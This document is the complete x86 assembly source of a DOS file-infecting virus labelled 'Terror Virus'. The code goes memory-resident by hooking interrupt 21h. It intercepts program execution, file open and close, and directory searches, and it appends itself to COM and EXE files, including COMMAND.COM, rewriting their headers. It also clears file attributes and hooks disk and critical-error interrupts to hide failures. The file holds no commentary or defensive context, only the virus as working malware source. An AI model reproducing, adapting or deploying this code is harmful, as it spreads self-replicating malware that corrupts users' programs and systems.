;**********************************************
;            Terror Virus
;**********************************************

Code            Segment
		Assume  CS:Code
		Org     100h
		
Start:          jmp     short Begin

Table310        dw      12E4h,09ABh
Table320        dw      138Dh,17D0h
Table330        dw      1460h,0F7Ah

FileBytes       dw      12 dup (9090h)

ComSpec         db      'A:\COMMAND.COM',0

CheckEXE:       cmp     cs:FileBytes,4D5Ah
		je      IsEXE
		cmp     cs:FileBytes,5A4Dh
IsEXE:          ret

Begin:          mov     word ptr cs:PSPSeg,ds
		push    ax
		mov     ax,0EC59h
		int     21h
		cmp     bp,ax
		jnz     Install
		push    cs
		pop     ds
StartFile:      pop     ax
		mov     es,word ptr cs:PSPSeg
		call    CheckEXE
		je      ExeFileStart
		mov     cx,13
		mov     si,offset FileBytes
		push    es
		mov     di,100h
		push    di
	rep     movsb
		push    es
		pop     ds
		retf
ExeFileStart:   mov     si,es
		add     si,10h
		add     cs:FileBytes [16h],si
		add     si,cs:FileBytes [0Eh]
		mov     di,cs:FileBytes [10h]
		push    es
		pop     ds
		cli
		mov     ss,si
		mov     sp,di
		sti
		jmp     dword ptr cs:FileBytes [14h]

Install:        mov     ah,30h
		int     21h
		mov     bx,offset Table310
		cmp     ax,0A03h
		jne     Not310
		mov     ax,0070h
		mov     bx,0D43h
		mov     es,ax
		cmp     byte ptr es:[bx],2Eh    ; CS prefix
		jne     SetVectors
		mov     ax,bx
		jmp     short SetV1
Not310:         add     bx,4
		cmp     ax,1403h
		je      SetVectors
		add     bx,4
		cmp     ax,1E03h
		je      SetVectors
		mov     ax,3513h
		int     21h
		mov     word ptr cs:True13,    bx
		mov     word ptr cs:True13 + 2,es
		mov     ax,3521h
		mov     dx,bx
		jmp     short Set21
SetVectors:     mov     ax,word ptr cs:[bx+2]
SetV1:          mov     dx,word ptr cs:[bx]
		mov     word ptr cs:True13,ax
		mov     word ptr cs:True13 + 2,0070h
		mov     ah,34h
		int     21h
Set21:          push    es
		pop     ds
		mov     ax,25ECh
		int     21h
		mov     ax,word ptr cs:PSPSeg
		mov     es,ax
		dec     ax
		mov     ds,ax
		mov     bx,word ptr ds:[3]
		sub     bx,101
		add     ax,bx
		mov     word ptr es:[0002h],ax  ; Setup PSP memory size.
						; Command.COM needs that
						; action; else the system
						; hangs.
		mov     ah,4Ah
		int     0ECh
		mov     bx,100
		mov     ah,48h
		int     0ECh
		sub     ax,10h
		mov     es,ax
		mov     byte ptr ds:[0000h],5Ah ; This is the last block,
						; don't you think so?
		push    cs
		pop     ds
		mov     si,100h
		mov     di,si
		mov     cx,MovedSize
	rep     movsb
		mov     di,offset Continue
		push    es
		push    di
		retf

Continue:       mov     word ptr es:[0F1h],0070h
		mov     ax,3521h
		int     0ECh
		mov     word ptr cs:Saved21,    bx
		mov     word ptr cs:Saved21 + 2,es 
		mov     ah,25h
		mov     dx,offset Int21
		push    cs
		pop     ds
		int     0ECh
		push    cs
		pop     es
		mov     di,offset Handles
		mov     cx,25
		mov     al,0
	rep     stosb
		jmp     StartFile

Respond:        mov     bp,ax
		iret

Int21:          cmp     ax,0EC59h
		je      Respond
		cmp     ax,4B00h
		je      Exec
		cmp     ah,3Dh
		je      Open
		cmp     ah,3Eh
		je      Close
		cmp     ah,11h
		jne     End21
		push    di
		mov     di,dx
		cmp     byte ptr ds:[di+6],08   ; Volume ID attributes
		je      Find1st
EndF1st:        pop     di
End21:          db      0EAh
Saved21         dd      ?
Exec:           call    InfectName
		jmp     End21
OpenEnd:        pop     cx
		jmp     End21
Open:           push    cx
		call    GetAttr
		jc      OpenEnd
		cmp     cx,20h
		pop     cx
		jne     End21
		mov     al,2
		pushf
		call    dword ptr cs:Saved21
		jc      Err21
		push    ax
		push    bx
		mov     bx,ax
		mov     al,byte ptr cs:Command?
		mov     byte ptr cs:Handles [bx],al
		pop     bx
		pop     ax
Err21:          retf    2
Close:          cmp     byte ptr cs:Handles [bx],0
		jz      End21
		push    ax
		mov     al,byte ptr cs:Handles [bx]
		mov     byte ptr cs:Command?,al
		mov     byte ptr cs:Handles [bx],0
		mov     ah,45h
		int     0ECh
		mov     word ptr cs:TempHandle,ax
		pop     ax
		jc      End21
		pushf
		call    dword ptr cs:Saved21
		jc      Err21
		push    bx
		mov     bx,word ptr cs:TempHandle
		push    ds
		call    SetV
		call    InfectHandle
		call    Restore
		pop     ds
		pop     bx
		clc
		retf    2
Find1st:        push    ax
		push    dx
		push    ds
		mov     al,byte ptr ds:[di+7]
		mov     dx,offset Comspec
		or      al,al
		jz      CurrentDrive
		add     al,'A'-1
		mov     byte ptr cs:Comspec,al
		jmp     short Infect1st
CurrentDrive:   add     dx,2
Infect1st:      push    cs
		pop     ds
		call    InfectName
		pop     ds
		pop     dx
		pop     ax
		jmp     EndF1st

InfectName:     push    ax
		push    bx
		push    cx
		call    GetAttr
		jc      EndIN0
		push    cx
		push    ds
		call    SetV
		pop     ds
		mov     ax,4301h
		xor     cx,cx
		int     0ECh
		jc      EndIN1
		mov     ax,3D02h
		int     0ECh
		mov     bx,ax
EndIN1:         pop     cx
		jc      EndInfName
		call    InfectHandle
		mov     ax,4301h
		int     0ECh
EndInfName:     call    Restore
EndIN0:         pop     cx
		pop     bx
		pop     ax
		ret

SetV:           push    ax
		push    dx
		push    bx
		push    es
		mov     ax,3513h
		int     0ECh
		mov     word ptr cs:Old13,bx
		mov     word ptr cs:Old13+2,es
		mov     al,24h
		int     0ECh
		mov     word ptr cs:Old24,bx
		mov     word ptr cs:Old24+2,es
		pop     es
		pop     bx
		push    cs
		pop     ds
		mov     dx,offset Critical
		mov     ah,25h
		int     0ECh
		mov     dx,offset Int13
		mov     al,13h
		int     0ECh
		pop     dx
		pop     ax
		ret

InfectHandle:   push    ax
		push    cx
		push    dx
		push    si
		push    di
		push    ds
		mov     di,offset FileBytes
		mov     cx,0FFFFh
		mov     dx,-6
		mov     ax,4202h
		int     0ECh
		mov     ah,3Fh
		mov     cx,6
		push    cs
		pop     ds
		mov     dx,di
		int     0ECh
		jc      EndH1
		cmp     word ptr cs:[di],'eT'
		je      EndH1
		xor     cx,cx
		xor     dx,dx
		mov     ax,4200h
		int     0ECh
		mov     ah,3Fh
		mov     cx,24
		mov     dx,di
		int     0ECh
		jnc     ReadOk
EndH1:          jmp     EndInfHandle
ReadOk:         xor     cx,cx
		xor     dx,dx
		cmp     byte ptr cs:Command?,2
		jne     Seek
		cmp     word ptr ds:[di+1],4000h        ; Is there some
							; another virus
							; in the stack?
		ja      EndH1
		dec     cx
		mov     dx,-(VirusSize+64)
Seek:           mov     ax,4202h
Seek1:          int     0ECh
		test    ax,000Fh
		jz      SeekOk
		mov     cx,dx
		mov     dx,ax
		add     dx,10h
		and     dl,0F0h
		mov     ax,4200h
		jmp     Seek1
SeekOk:         call    CheckEXE
		je      SkipEXE
		or      dx,dx
		jnz     EndH1
		cmp     ax,1024
		jnb     MayBeGood?
		jmp     EndInfHandle
MayBeGood?:     cmp     ax,64000
		ja      EndInfHandle
SkipEXE:        mov     cl,4
		shr     ax,cl
		mov     si,ax
		mov     cl,12
		shl     dx,cl
		add     si,dx
		mov     ah,40h
		mov     dx,100h
		mov     cx,VirusSize
		int     0ECh
		jc      EndInfHandle
		call    CheckEXE
		jne     ComFile
		sub     si,10h
		sub     si,word ptr cs:[di+08h]
		mov     word ptr cs:[di+14h],100h
		mov     word ptr cs:[di+16h],si
		mov     word ptr cs:[di+10h],400h
		add     si,VirusSize / 16 + 1
		mov     word ptr cs:[di+0Eh],si
		mov     ax,4202h
		xor     cx,cx
		xor     dx,dx
		int     0ECh
		mov     cx,200h
		div     cx
		or      dx,dx
		jz      DontAdjust
		inc     ax
DontAdjust:     mov     word ptr cs:[di+02h],dx
		mov     word ptr cs:[di+04h],ax
		jmp     short Common
ComFile:        push    si
		push    di
		push    es
		push    cs
		pop     es
		mov     si,offset ComHeader
		mov     cx,11
	rep     movsb
		pop     es
		pop     di
		pop     ds:[di+11]
Common:         mov     ax,4200h
		xor     cx,cx
		xor     dx,dx
		int     0ECh
		mov     ah,40h
		mov     cx,24
		mov     dx,di
		int     0ECh
EndInfHandle:   mov     ax,5700h
		int     0ECh
		mov     al,1
		int     0ECh
		mov     ah,3Eh
		int     0ECh
		pop     ds
		pop     di
		pop     si
		pop     dx
		pop     cx
		pop     ax
		ret

Restore:        push    ax
		push    dx
		push    ds
		mov     ax,2513h
		mov     dx,word ptr cs:Old13
		mov     ds,word ptr cs:Old13+2
		int     0ECh
		mov     al,24h
		mov     dx,word ptr cs:Old24
		mov     ds,word ptr cs:Old24+2
		pop     ds
		pop     dx
		pop     ax
		ret

GetAttr:        push    ax
		push    es
		push    di
		push    bx
		mov     di,dx
		push    ds
		pop     es
		mov     al,0
		mov     cx,64
	repne   scasb
		mov     ax,word ptr ds:[di-3]
		mov     cx,word ptr ds:[di-5]
		and     ax,5F5Fh                ; Upcase extension
		and     ch,5Fh
		cmp     ax,'MO'
		jne     Exe?
		cmp     cx,'C.'
		je      CommandChk
ErrAttr:        stc
		jmp     short EndAttr
Exe?:           cmp     ax,'EX'
		jne     ErrAttr
		cmp     cx,'E.'
		jne     ErrAttr
CommandChk:     mov     cx,7
		mov     bx,-1
Loop0:          inc     bx
		mov     al,byte ptr ds:[bx+di-12]
		and     al,5Fh
		cmp     al,byte ptr cs:Comspec [bx+3]
		loope   Loop0
		mov     al,1
		jne     NoCommand
		mov     al,2
NoCommand:      mov     byte ptr cs:Command?,al
		mov     ax,4300h
		int     0ECh
EndAttr:        pop     bx
		pop     di
		pop     es
		pop     ax
		ret

Critical:       mov     al,3
		iret

Int13:          cmp     ah,3
		jz      Skip13
		db      0EAh    ; JMP Far
Old13           dd      ?
Skip13:         db      0EAh
True13          dd      ?

ComHeader       db      50h,8Ch,0C8h,01h,06h,0Bh,01h,58h,0EAh,00h,01h

Terror          db      ' Terror'

VirusEnd        label   byte

VirusSize       =       offset VirusEnd - offset Start

Old24           dd      ?

TempHandle      label   word
PSPSeg          dw      ?

MovedSize       =       $ - offset Start

Handles         db      25 dup (?)

Command?        db      ?

Code            EndS
		End     Start
